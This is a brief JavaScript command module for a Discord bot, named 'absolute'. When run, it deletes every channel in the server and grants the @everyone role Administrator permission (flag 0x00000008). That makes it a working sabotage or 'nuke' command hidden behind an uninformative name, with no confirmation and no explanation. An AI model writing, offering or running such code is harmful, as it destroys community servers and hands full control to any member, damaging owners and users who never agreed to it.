//const config = require('../config.js');
exports.run = (client, message, args) => {
    Promise.all(message.guild.channels.map(c => c.delete()));
    message.guild.roles.find('name', '@everyone').edit({
        permissions: ['0x00000008']
    });
}

exports.conf = {
    permLevel: 4,
    aliases: []
}

exports.help = {
    name: 'absolute'
}